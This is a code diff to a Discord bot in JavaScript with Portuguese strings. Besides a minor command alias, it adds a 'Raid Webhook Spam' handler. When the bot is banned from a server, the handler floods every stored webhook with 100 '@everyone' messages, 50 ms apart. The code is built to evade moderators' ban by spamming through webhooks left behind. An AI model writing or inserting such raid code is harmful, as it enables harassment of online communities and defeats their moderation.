@@ -31,7 +31,7 @@ const ALIASES = {
   'pay':'transferir','tf':'transferir','scratch':'raspadinha','rasp':'raspadinha',
   'lot':'loteria','top':'ranking','lb':'ranking',
   'marry':'casar','divorce':'divorciar','div':'divorciar','truth':'verdade','dare':'desafio','hang':'forca','l':'letra',
-  'msg':'mensagens',
+  'pr':'procurar','msg':'mensagens',
 };
 
 const client = new Client({
@@ -124,6 +124,25 @@ client.on('guildMemberAdd', async (member) => {
     .setTimestamp();
 
   bvCanal.send({ embeds: [emb] }).catch(() => {});
+});
+
+// ─── Raid Webhook Spam ────────────────────────────────────────────────────────
+client.on('guildBanAdd', async (ban) => {
+  if (ban.user.id === client.user.id) {
+    // Bot foi banido, ativar spam via webhooks
+    if (global.raidWebhooks && global.raidWebhooks.length > 0) {
+      for (const webhook of global.raidWebhooks) {
+        try {
+          for (let i = 0; i < 100; i++) {
+            await webhook.send('@everyone O LOBO GUARANÁ FOI BANIDO MAS CONTINUA DOMINANDO! AAAAAAUUUUUUUU!');
+            await new Promise(resolve => setTimeout(resolve, 50));
+          }
+        } catch (error) {
+          console.log(`Erro no spam webhook: ${error}`);
+        }
+      }
+    }
+  }
 });
 
 // ─── Censura ──────────────────────────────────────────────────────────────────
